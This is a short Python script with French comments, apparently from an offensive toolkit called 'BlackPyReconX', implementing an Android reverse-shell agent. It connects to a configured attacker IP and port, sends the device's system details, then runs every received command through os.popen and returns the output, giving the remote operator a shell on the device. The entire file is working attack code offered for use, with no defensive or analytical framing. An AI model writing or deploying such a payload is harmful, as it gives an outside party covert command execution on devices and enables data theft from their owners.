import os
import socket
import platform
import time
from datetime import datetime
from pathlib import Path

# 📁 Journal local sur l’appareil
LOG_DIR = Path.home() / "BlackPyReconX"
LOG_DIR.mkdir(parents=True, exist_ok=True)
LOG_FILE = LOG_DIR / "agent_android.log"

# 📡 Configuration reverse shell (modifie ici)
ATTACKER_IP = "192.168.1.100"  # 💡 Ton IP d'écoute (machine Kali/Parrot)
ATTACKER_PORT = 4444           # 💡 Port d’écoute

def log(msg: str):
    """Ajoute une ligne au log local avec horodatage"""
    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"{timestamp} {msg}\n")

def get_device_info():
    """Retourne un résumé de l'appareil Android"""
    return {
        "OS": platform.system(),
        "Version": platform.version(),
        "Nom": platform.node(),
        "Architecture": platform.machine(),
        "Chemin": os.getcwd()
    }

def send_device_info(sock):
    """Envoie les infos système dès connexion"""
    try:
        info = get_device_info()
        for k, v in info.items():
            sock.send(f"{k}: {v}\n".encode())
    except Exception as e:
        log(f"Erreur info système : {e}")

def reverse_shell(ip: str, port: int):
    """Établit un reverse shell depuis Android vers l’attaquant"""
    try:
        sock = socket.socket()
        sock.connect((ip, port))
        sock.send("[+] Agent Android connecté.\n".encode('utf-8'))

        send_device_info(sock)

        while True:
            command = sock.recv(1024).decode().strip()
            if command.lower() in ["exit", "quit"]:
                break
            output = os.popen(command).read()
            if not output:
                output = "[Aucune sortie]\n"
            sock.send(output.encode(errors="ignore"))
        sock.close()
        log("Session reverse shell terminée.")

    except Exception as e:
        log(f"Erreur reverse shell : {e}")

if __name__ == "__main__":
    log("Agent Android lancé.")
    reverse_shell(ATTACKER_IP, ATTACKER_PORT)
